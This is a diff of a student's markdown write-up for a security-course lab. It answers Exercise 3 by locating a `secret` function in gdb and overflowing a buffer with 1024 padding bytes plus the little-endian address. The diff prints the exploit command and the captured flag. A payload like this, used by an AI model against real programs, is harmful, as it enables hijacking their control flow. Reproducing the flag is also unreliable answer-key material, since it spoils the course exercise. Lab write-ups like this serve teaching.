@@ -28,6 +28,7 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 >```
 
 <div style="page-break-after: always;"></div>
+
 ###### Exercise 2
 
 > [!exercise]+ Exercise 2
@@ -52,24 +53,50 @@ To exploit the program and obtain the secret, we target the buffer overflow vuln
 >           `YY~~~~YY'
 >            ||    ||
 >```
-
 <div style="page-break-after: always;"></div>
 
+###### Exercise 3
 
-```
-(gdb) print secret
-$1 = {void ()} 0x565561ed <secret>
-```
-
-
-> [!exercise]+ Exercise 3
-> Go to/ home/q3/. Exploit the program to get the secret.
+> [!exercise] Exercise 3
+> Go to /home/q3/. Exploit the program to get the secret.
 > 
 > **Answer:**
 > This one is very similar to question 2. All we need to do is overwrite the unsigned int with the address of the `secret` function. We attain this by opening the binary inside `gdp` and printing the address.
 > 
-> Now that we have the address, we convert it to little endian format and place it inside our payload ()
+> ```
+> (gdb) print secret
+> $1 = {void ()} 0x565561ed \<secret>
+> ```
+> Now that we have the address, we convert it to little endian format and place it inside our payload (using the same method as question 2)
+> 
+> ```
+> student@hacklabvm:/home/q3$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xed\x61\x55\x56")')
+> Jumping to function at 0x565561ed!!
+>  _________________________________________
+> / csf2024s1_{hiddenly-avitaminoses-diasta \
+> \ lsis}                                   /
+>  -----------------------------------------
+>   \
+>    \
+>        __     
+>       UooU\.'@@@@@@`.
+>       \__/(@@@@@@@@@@)
+>            (@@@@@@@@)
+>            `YY~~~~YY'
+>             ||    ||
+> ```
 
+<div style="page-break-after: always;"></div>
+
+###### Exercise 4
+
+<div style="page-break-after: always;"></div>
+
+###### Exercise 5
+
+<div style="page-break-after: always;"></div>
+
+###### Exercise 6
 
 
 
